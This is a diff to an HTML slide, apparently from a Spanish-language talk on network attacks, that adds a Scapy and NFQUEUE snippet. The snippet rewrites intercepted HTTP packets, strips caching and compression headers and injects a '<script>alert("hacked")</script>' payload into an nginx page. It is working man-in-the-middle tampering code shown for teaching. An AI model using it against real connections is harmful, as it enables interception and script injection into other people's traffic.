@@ -4,7 +4,7 @@
 
 <head>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-	<title>Si todo salió bien...</title>
+	<title>Modificación con Scapy + NFQUEUE</title>
   <link rel="stylesheet" href="styles.css">
 
 <style>
@@ -76,8 +76,30 @@ footer {
 	<section style="height: 80%">
 	
 		<article>
-            <h1>Si todo salió bien...</h1>
-<p><img alt="alt text" src="hacked.png" /></p>
+            <h1>Modificación con Scapy + NFQUEUE</h1>
+<div class="codehilite"><pre><span></span><span class="n">pkt</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">packet</span><span class="o">.</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">Raw</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">pkt</span> <span class="ow">or</span> <span class="n">TCP</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">pkt</span><span class="p">:</span>
+    <span class="n">packet</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+    <span class="k">continue</span>
+
+<span class="k">del</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">len</span>
+<span class="k">del</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span>
+<span class="k">del</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span>
+
+<span class="n">search_for</span>  <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;the nginx web server is successf&#39;</span>
+<span class="n">replace_for</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&lt;script&gt;alert(&quot;hacked&quot;)&lt;/script&gt;&#39;</span>
+
+<span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;If-Modified-Since.*\r\n&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
+<span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;If-None-Match.*\r\n&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
+<span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;Accept-Encoding.*\r\n&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
+<span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;Connection:.*\r\n&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s1">&#39;Connection: close</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
+<span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;Upgrade-Insecure-Requests.*\r\n&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
+<span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">search_for</span><span class="p">,</span> <span class="n">replace_for</span><span class="p">,</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
+
+<span class="n">packet</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">)</span>
+<span class="n">packet</span><span class="o">.</span><span class="n">mangle</span><span class="p">()</span>
+</pre></div>
 		</article>
 
 	</section>
